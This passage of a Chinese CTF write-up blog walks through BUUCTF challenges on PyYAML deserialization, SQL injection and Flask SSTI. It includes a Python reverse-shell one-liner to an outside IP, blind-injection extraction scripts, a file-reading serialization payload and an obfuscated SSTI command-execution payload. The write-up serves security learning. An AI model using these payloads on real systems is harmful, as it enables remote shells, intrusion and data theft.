request.args.get(<span class="string">&#x27;path&#x27;</span>).replace(<span class="string">&#x27;../&#x27;</span>, <span class="string">&#x27;hack&#x27;</span>).replace(<span class="string">&#x27;..\\&#x27;</span>, <span class="string">&#x27;hack&#x27;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f = f.read()</span><br><span class="line">                <span class="keyword">if</span> waf(f):</span><br><span class="line">                    <span class="built_in">print</span>(yaml.load(f, Loader=Loader))</span><br><span class="line">                    <span class="keyword">return</span> render_template(<span class="string">&#x27;sayings.html&#x27;</span>, yaml=<span class="string">&#x27;鲁迅说：当你看到这句话时，还没有拿到flag，那就赶紧重开环境吧&#x27;</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">return</span> render_template(<span class="string">&#x27;sayings.html&#x27;</span>, yaml=<span class="string">&#x27;鲁迅说：你说得不对&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;sayings.html&#x27;</span>, yaml=<span class="string">&#x27;鲁迅说：&#x27;</span>+<span class="built_in">str</span>(e))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;view/jojo.yaml&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            sayings = yaml.load(f, Loader=Loader)</span><br><span class="line">            saying = random.choice(sayings)</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;sayings.html&#x27;</span>, yaml=saying)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>漏洞点，会用yaml.load函数来加载文件（可控），配合文件上传可以造成yaml反序列化漏洞</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(yaml.load(f, Loader=Loader))</span><br></pre></td></tr></table></figure><p><a href="https://www.tr0y.wang/2022/06/06/SecMap-unserialize-pyyaml/#%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2">yaml反序列化漏洞</a></p><p>根据上面文章，可以知道我们需要上传一个poc.yaml</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">!!python/module:static.upload</span><br></pre></td></tr></table></figure><p>一个<code>__init__.py</code>文件</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os,pty,socket;s=socket.socket();s.connect((<span class="string">&quot;120.77.73.212&quot;</span>,<span class="number">2333</span>));[os.dup2(s.fileno(),f)<span class="keyword">for</span> f <span class="keyword">in</span>(<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>)];pty.spawn(<span class="string">&quot;sh&quot;</span>)</span><br></pre></td></tr></table></figure><p>上传文件脚本</p><p>需要注意的是<code>imgUpload()</code>中<code>file = request.files.get(&#39;editormd-image-file&#39;)</code>以及带上session</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://1aef01d5-e675-4e45-9357-2524a3e5c570.node4.buuoj.cn:81/blog/imgUpload&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &#123; name : (文件名,文件内容，文件MIME)  &#125;  将文件信息填入元组（）中，只有文件内容是必选的。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 上传本地文件</span></span><br><span class="line"><span class="comment">#files = &#123;&quot;editormd-image-file&quot;: (&quot;__init__.py&quot;, open(&#x27;E:\scripts\poc.py&#x27;, &#x27;rb&#x27;))&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 直接上传文件内容字符串（注意要用二进制）</span></span><br><span class="line">files = &#123;<span class="string">&quot;editormd-image-file&quot;</span>: (<span class="string">&quot;poc.yaml&quot;</span>, <span class="string">b&#x27;!!python/module:static.upload&#x27;</span>)&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment"># bp代理</span></span><br><span class="line">pro = &#123;<span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;http://127.0.0.1:8011&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;direction&#x27;</span>:<span class="string">&#x27;upload&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cookie = &#123;</span><br><span class="line">    <span class="string">&#x27;session&#x27;</span> : <span class="string">&#x27;eyJfcGVybWFuZW50Ijp0cnVlLCJ1c2VybmFtZSI6ImFkbWluIn0.Y2S-xQ.V9-DZaiArnzERULY9NHBYf3WL6s&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = requests.post(url=url,files=files,proxies=pro,cookies=cookie,data=data)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221105135517382-1687419303719.png" alt="image-20221105135517382"></p><p>然后服务器监听端口，访问<code>/blog/saying?path=static/upload/poc.yaml</code>即可</p><p><img src="/../images/image-20221105135258653-1687419303719.png" alt="image-20221105135258653"></p><h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><h2 id="强网杯2019-随便注"><a href="#强网杯2019-随便注" class="headerlink" title="[强网杯2019]随便注"></a>[强网杯2019]随便注</h2><p>告诉我们注入点了</p><p>参数类型，由语法错误可知是单引号闭合</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">error 1064 : You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#x27;&#x27;1&#x27;&#x27;&#x27; at line 1</span><br></pre></td></tr></table></figure><p>经过测试是堆叠注入，所以其后端sql查询使用的是mysqli_multi_query() </p><p>并且有过滤</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/select|update|delete|drop|insert|where|\./i&quot;</span>,<span class="variable">$inject</span>);</span><br></pre></td></tr></table></figure><p>通过show tables知道表名，所以可以使用handle来绕过select，得到表中的信息。</p><h2 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h2><p>只有一个登陆界面，无注册界面，目录扫描无结果。</p><p>测试为单引号闭合。</p><p>在登录后的search.php源代码中找到注释，经过解码得到<code>select * from user where username = &#39;$name&#39;</code></p><p>猜测登陆上去即可获得flag</p><p>通过联合查询构造临时用户</p><p>username&#x3D;<code>1&#39; union select 1,&#39;admin&#39;,&#39;c4ca4238a0b923820dcc509a6f75849b&#39;#</code></p><p>passwd&#x3D;<code>1</code></p><blockquote><p>需要注意的是前面不能为admin’，不然它就会去比较原来admin所对应的密码</p></blockquote><p>成功登录获得flag。</p><h2 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h2><p>join注册后，点击username，发现url参数<code>view.php?no=1</code>，可能存在sql注入</p><p>进行测试，<code>1^0</code>页面报错，所以存在sql注入</p><p>判断参数类型，发现为整型</p><p>进行fuzz，发现<code>union select</code>被过滤</p><p><img src="/../images/image-20220728125208126-1687489655110.png" alt="image-20220728125208126"></p><p>尝试构造<code>union/**/select</code>绕过</p><p><img src="/../images/image-20220728125647157-1687489655112.png" alt="image-20220728125647157"></p><p>发现可以绕过，且字段数不为3</p><p><img src="/../images/image-20220728125537515-1687489655113.png" alt="image-20220728125537515"></p><p>发现反序列化函数，字段数为4，可利用的字段在2位置</p><blockquote><p>到这里sql注入就有两个思路，一是联合注入(页面有回显点)，二是报错注入（页面有报错日志，这里过滤了0x7e）。</p></blockquote><p>接下来按照正常思路做即可。</p><p>最后查字段值时会发现users表的第四列data中存放的是经过序列化后的用户的信息</p><p><img src="/../images/image-20220728172644784-1687489655113.png" alt="image-20220728172644784"></p><p>关于反序列化，就一定要有源码。</p><p>进行目录扫描得到user.php.bak，以及flag.php的存在</p><p>主要关注</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    <span class="comment">#用curl对博客地址发起请求，并获取内容</span></span><br><span class="line">        <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$output</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$httpCode</span> = <span class="title function_ invoke__">curl_getinfo</span>(<span class="variable">$ch</span>, CURLINFO_HTTP_CODE);</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$httpCode</span> == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$blog</span> = <span class="variable language_">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="variable">$blog</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>构造序列化</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">#利用file协议请求本地文件</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;file:///var/www/html/flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">UserInfo</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?no=-<span class="number">1</span> union<span class="comment">/**/</span>select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="string">&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;1&quot;;s:3:&quot;age&quot;;i:0;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27;</span></span><br></pre></td></tr></table></figure><blockquote><p>这里把其放在第四列，是因为博客信息是存储在users表的第四列data中的</p><p>能够成功的原因是union&#x2F;**&#x2F;select不加表名的特性，会在前面的select表中构造临时数据。</p></blockquote><p>最后在源代码blog content部分可以得到flag.php的内容。</p><p><img src="/../images/image-20220728173710364-1687489655113.png" alt="image-20220728173710364"></p><h2 id="网鼎杯2018-Unfinish"><a href="#网鼎杯2018-Unfinish" class="headerlink" title="[网鼎杯2018]Unfinish"></a>[网鼎杯2018]Unfinish</h2><p>原理</p><blockquote><p>在mysql中+只能当作算术运算符，与php中的+类似 ，可以进行数字字符串+数字的计算</p></blockquote><p><img src="/../images/image-20220717191455431-1687489655114.png" alt="image-20220717191455431"></p><p>前置条件</p><blockquote><p>查询的结果只有一列</p></blockquote><p><img src="/../images/image-20220718093833432-1687489655113.png" alt="image-20220718093833432"></p><p>进去是一个登录界面，一般先找注册界面，登录后再找注入点。</p><p>直接访问url&#x2F;register.php</p><p>需要填三个信息：邮箱，用户名，密码</p><p>登录后，观察到页面只有一个可疑之处,显示了用户名</p><p><img src="/../images/image-20220717182811431-1687489655115.png" alt="image-20220717182811431"></p><p>所以，注入点应该是在用户名处，为回显注入。</p><blockquote><p>这里可以猜测显示用户名的后端语句为<code>select username from table where email=$email</code></p></blockquote><hr><p>回到注册界面继续测试，验证想法。</p><p>注册用户名1”注册成功，用户名为1’时注册失败</p><p><img src="/../images/image-20220717184809571-1687489655115.png" alt="image-20220717184809571"></p><blockquote><p>猜测注册的sql语句为<code>insert into table  value(&#39;$email&#39;,&#39;$username&#39;,&#39;$passwd&#39;) </code>单引号闭合</p></blockquote><p>还有一个点就是，邮箱是唯一的，如果用相同的邮箱注册多个账号只有第一个账号是可以登陆上去的。</p><p>进行fuzz</p><p><img src="/../images/image-20220717185630970-1687489655114.png" alt="image-20220717185630970"></p><p>发现红框内的被过滤</p><p>因为语句为<code>insert into table  value(&#39;$email&#39;,&#39;$username&#39;,&#39;$passwd&#39;) </code></p><p>只能使用运算盲注（其他的构造不了）</p><p>payload</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">register_url = <span class="string">&#x27;http://645cbdc0-53d4-4a12-8d7c-653400adc1dd.node4.buuoj.cn:81/register.php&#x27;</span></span><br><span class="line">login_url = <span class="string">&#x27;http://645cbdc0-53d4-4a12-8d7c-653400adc1dd.node4.buuoj.cn:81/login.php&#x27;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    register_data = &#123;</span><br><span class="line">        <span class="comment">#邮箱是唯一的，如果用相同的邮箱注册多个账号只有第一个账号是可以登陆上去的。所以每次注册邮箱都要不同</span></span><br><span class="line">        <span class="string">&#x27;email&#x27;</span>: <span class="string">&#x27;111@123.com&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(i),</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>: <span class="string">&quot;0&#x27; + ascii(substr((select * from flag) from &#123;&#125; for 1)) + &#x27;0&quot;</span>.<span class="built_in">format</span>(i),</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.post(url=register_url, data=register_data)</span><br><span class="line"></span><br><span class="line">    login_data = &#123;</span><br><span class="line">        <span class="string">&#x27;email&#x27;</span>: <span class="string">&#x27;111@123.com&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(i),</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    res_ = requests.post(url=login_url, data=login_data)</span><br><span class="line">    code = re.search(<span class="string">r&#x27;&lt;span class=&quot;user-name&quot;&gt;\s*(\d*)\s*&lt;/span&gt;&#x27;</span>, res_.text)</span><br><span class="line">    flag+=<span class="built_in">chr</span>(<span class="built_in">int</span>(code.group(<span class="number">1</span>)))</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h2 id="GYCTF2020-Ezsqli"><a href="#GYCTF2020-Ezsqli" class="headerlink" title="[GYCTF2020]Ezsqli"></a>[GYCTF2020]Ezsqli</h2><h2 id="RoarCTF-2019-Online-Proxy"><a href="#RoarCTF-2019-Online-Proxy" class="headerlink" title="[RoarCTF 2019]Online Proxy"></a>[RoarCTF 2019]Online Proxy</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> ip <span class="keyword">from</span> ip_table</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">if(isset($_SERVER[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;</span><br><span class="line">    $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] <span class="operator">=</span> $_SERVER[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ip <span class="operator">=</span> $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$last_ip <span class="operator">=</span> &quot;&quot;;</span><br><span class="line">$<span class="keyword">result</span> <span class="operator">=</span> query(&quot;select current_ip, last_ip from ip_log where uuid = &#x27;&quot;.addslashes($uuid).&quot;&#x27;&quot;);</span><br><span class="line">if(<span class="built_in">count</span>($<span class="keyword">result</span>) <span class="operator">&gt;</span> <span class="number">0</span>) </span><br><span class="line">&#123;</span><br><span class="line">    if($ip <span class="operator">!=</span><span class="operator">=</span> $<span class="keyword">result</span>[<span class="number">0</span>][<span class="string">&#x27;current_ip&#x27;</span>]) &#123;</span><br><span class="line">        $last_ip <span class="operator">=</span> $<span class="keyword">result</span>[<span class="number">0</span>][<span class="string">&#x27;current_ip&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        query(&quot;delete from ip_log where uuid=&#x27;&quot;.addslashes($uuid).&quot;&#x27;&quot;);</span><br><span class="line">    &#125; </span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">        $last_ip <span class="operator">=</span> $<span class="keyword">result</span>[<span class="number">0</span>][<span class="string">&#x27;last_ip&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">query(&quot;insert into ip_log values (&#x27;&quot;.addslashes($uuid).&quot;&#x27;, &#x27;&quot;.addslashes($ip).&quot;&#x27;, &#x27;$last_ip&#x27;);&quot;);</span><br></pre></td></tr></table></figure><p>第一次表中无数据，if(count($result) &gt; 0)不成立，$ip&#x3D;x-forwarded-for1  $last_ip&#x3D;空,插入ip_log表中</p><p>第二次 表中有数据，if(count($result) &gt; 0) 成立，$ip&#x3D;x-forwarded-for2    $last_ip&#x3D;x-forwarded-for1 ,删除第一次插入的数据，插入第二次数据。</p><p>第三次表中有数据, 查询时会用到x-forwarded-for1，这里就是利用点</p><blockquote><p>不看源码，推不出来</p><p>下次如果猜是二次注入，可以多试几次，像这个就是第三次执行</p></blockquote><p>单引号闭合</p><p>第一次输入<code>1&#39; or &#39;1</code></p><p>第二次输入1</p><p>第三次输入1</p><p><img src="/../images/image-20220812122454399-1687489655115.png" alt="image-20220812122454399"></p><p>可以看到第一次的输入执行了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://node4.buuoj.cn:26803/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_table</span>():</span><br><span class="line">    table = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="comment">#控制长度</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">1000</span>):</span><br><span class="line">        left = <span class="number">32</span></span><br><span class="line">        right =<span class="number">128</span></span><br><span class="line">        <span class="keyword">while</span> left&lt;right:</span><br><span class="line">            mid = (left+right)//<span class="number">2</span></span><br><span class="line">            <span class="comment">#payload = &quot;0&#x27; or (ascii(substr((select group_concat(schema_name) from information_schema.schemata),&#123;&#125;,1))&gt;&#123;&#125;) or &#x27;0&quot;.format(i,mid)</span></span><br><span class="line">            <span class="comment">#payload = &quot;0&#x27; or (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;F4l9_D4t4B45e&#x27;),&#123;&#125;,1))&gt;&#123;&#125;) or &#x27;0&quot;.format(i,mid)</span></span><br><span class="line">            <span class="comment">#payload = &quot;0&#x27; or (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;F4l9_t4b1e&#x27;),&#123;&#125;,1))&gt;&#123;&#125;) or &#x27;0&quot;.format(i,mid)</span></span><br><span class="line">            payload = <span class="string">&quot;0&#x27; or (ascii(substr((select group_concat(F4l9_C01uMn) from F4l9_D4t4B45e.F4l9_t4b1e),&#123;&#125;,1))&gt;&#123;&#125;) or &#x27;0&quot;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line">            headers=&#123;</span><br><span class="line">                <span class="string">&#x27;Cookie&#x27;</span>:<span class="string">&#x27;track_uuid=1042e154-3129-4065-939a-e2c5f6d999e5&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;X-Forwarded-For&#x27;</span>:payload,</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment"># data=&#123;</span></span><br><span class="line">            <span class="comment">#     &#x27;id&#x27;:payload,</span></span><br><span class="line">            <span class="comment"># &#125;</span></span><br><span class="line"></span><br><span class="line">            res = requests.post(url=url,headers=headers)</span><br><span class="line">            <span class="comment">#res = requests.get(url=url,params=data)</span></span><br><span class="line">            <span class="comment"># print(res)</span></span><br><span class="line"></span><br><span class="line">            headers=&#123;</span><br><span class="line">                <span class="string">&#x27;Cookie&#x27;</span>:<span class="string">&#x27;track_uuid=1042e154-3129-4065-939a-e2c5f6d999e5&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;X-Forwarded-For&#x27;</span>:<span class="string">&#x27;payload&#x27;</span>,</span><br><span class="line">            &#125;</span><br><span class="line">            res = requests.post(url=url,headers=headers)</span><br><span class="line">            res = requests.post(url=url,headers=headers)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            </span><br><span class="line"></span><br><span class="line">            <span class="comment"># 字符串为成功的标志</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;Last Ip: 1&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                right = mid</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                left = mid+<span class="number">1</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 防止429</span></span><br><span class="line">            <span class="keyword">if</span> res.status_code == <span class="number">429</span>:</span><br><span class="line">                sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">            mid = (left+right)//<span class="number">2</span></span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        table+=<span class="built_in">chr</span>(mid)</span><br><span class="line">        <span class="built_in">print</span>(table)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">get_table()</span><br></pre></td></tr></table></figure><h2 id="盲注之ascii偏移"><a href="#盲注之ascii偏移" class="headerlink" title="盲注之ascii偏移"></a>盲注之ascii偏移</h2><p>使用场景</p><ul><li><p>关键字无过滤</p></li><li><p>select * from flag;的返回值只能为1行</p></li></ul><ol><li><p>判断字段数</p><p>假设有如下表，列数为2</p><p><img src="/../images/image-20220711155449466-1687489655114.png" alt="image-20220711155449466"></p><p>使用如下命令会报错</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> (<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>)<span class="operator">&gt;</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> flag)</span><br></pre></td></tr></table></figure></li><li><p>判断字段值</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span>(<span class="number">1</span>,<span class="number">1</span>)<span class="operator">&gt;</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> flag)</span><br></pre></td></tr></table></figure></li></ol><p><img src="/../images/image-20220711155653013-1687489655114.png" alt="image-20220711155653013"></p><p>​      <code>select(1,1)</code>的返回值为1,1;  <code>select * from flag</code>的返回值为1，’flag{xxxx}’；</p><p>​      1与1比较相等，1与’flag{xxxx}’比较，1&gt;’f’,所以最后返回的是1。</p><blockquote><p>​     因为mysql中数字与字符串比较与php中相同。</p></blockquote><p>所以我们可以根据此来编写脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&#x27;http://f6dc9323-7652-4182-8dd7-aea9fd09183f.node4.buuoj.cn:81/index.php&#x27;</span></span><br><span class="line"><span class="comment">#&#123;&#125;的位置是想要读取的字段值所在列</span></span><br><span class="line">payload=<span class="string">&#x27;0^((select 1,&quot;&#123;&#125;&quot;)&gt;(select * from f1ag_1s_h3r3_hhhhh))&#x27;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        </span><br><span class="line">        hexchar=flag+<span class="built_in">chr</span>(j)</span><br><span class="line"></span><br><span class="line">        params=&#123;<span class="string">&#x27;id&#x27;</span>:payload.<span class="built_in">format</span>(hexchar)&#125;</span><br><span class="line"></span><br><span class="line">        re=requests.post(url=url,data=params)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Nu1L&#x27;</span> <span class="keyword">in</span> re.text:</span><br><span class="line">            <span class="comment"># -1是因为当&gt;成立时，差值为1</span></span><br><span class="line">            flag+=<span class="built_in">chr</span>(j-<span class="number">1</span>)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h1 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h1><p>[网鼎杯 2020 白虎组]PicDown</p><p>[pasecactf_2019]flask_ssti</p><p>提示</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">line, key, key2</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(x ^ <span class="built_in">ord</span>(line[x]) ^ <span class="built_in">ord</span>(key[::-<span class="number">1</span>][x]) ^ <span class="built_in">ord</span>(key2[x])) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(line)))</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;flag&#x27;</span>] = encode(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W34&#x27;</span>, <span class="string">&#x27;xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVT5&#x27;</span>)</span><br></pre></td></tr></table></figure><p>在config中保存了flag加密后的值。</p><p>这题要开代理才能做，不然文件加载不了。。</p><p><img src="/../images/image-20221008124443508-1686983099354.png" alt="image-20221008124443508"></p><p>有过滤，unicode编码绕过</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[][<span class="string">&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;</span>][<span class="string">&quot;\u005f\u005f\u0062\u0061\u0073\u0065\u005f\u005f&quot;</span>][<span class="string">&quot;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&quot;</span>]()&#125;&#125;</span><br></pre></td></tr></table></figure><p>有回显当前环境下的类，那就正常找可利用类的位置</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;()[<span class="string">&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;</span>][<span class="string">&quot;\u005f\u005f\u0062\u0061\u0073\u0065\u0073\u005f\u005f&quot;</span>][<span class="number">0</span>][<span class="string">&quot;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&quot;</span>]()[<span class="number">80</span>][<span class="string">&quot;\u006c\u006f\u0061\u0064\u005f\u006d\u006f\u0064\u0075\u006c\u0065&quot;</span>](<span class="string">&quot;os&quot;</span>)[<span class="string">&quot;popen&quot;</span>](<span class="string">&quot;ls /&quot;</span>)|attr(<span class="string">&quot;read&quot;</span>)()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221008124706289-1686983099353.png" alt="image-20221008124706289"></p><p>可以看到是可以执行命令的。然后根据提示，就需要我们读取python文件。</p><h5 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h5><blockquote><ol><li><strong>在 linux 